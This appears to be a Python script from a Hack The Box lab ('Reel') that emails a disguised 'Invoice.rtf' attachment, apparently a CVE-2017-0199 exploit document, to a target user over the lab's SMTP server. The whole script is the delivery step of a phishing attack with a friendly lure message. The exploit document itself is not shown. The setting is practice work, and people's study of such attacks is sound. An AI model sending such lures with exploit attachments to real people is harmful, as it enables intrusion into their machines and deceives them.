import smtplib
import mimetypes
import email
import email.mime.application

msg = email.mime.Multipart.MIMEMultipart()
msg['Subject'] = 'Greetings'
msg['From'] = 'some1@nowhere.com'
msg['To'] = 'nico@megabank.com'
print("Msg content: {}".format(msg))

body = email.mime.Text.MIMEText("""Hello, how are you? I am fine.
This is a rather nice letter, don't you think?""")
msg.attach(body)

# PDF attachment
filename='/home/kali/htb/reel/CVE-2017-0199/Invoice.rtf'
fp=open(filename,'rb')
att = email.mime.application.MIMEApplication(fp.read(),_subtype="rtf")
fp.close()
att.add_header('Content-Disposition','attachment',filename='Invoice.rtf')
msg.attach(att)

s = smtplib.SMTP('10.10.10.77', 25)
s.sendmail('xyz@gmail.com',['nico@megabank.com'], msg.as_string())
print("Mail sent")
s.quit()
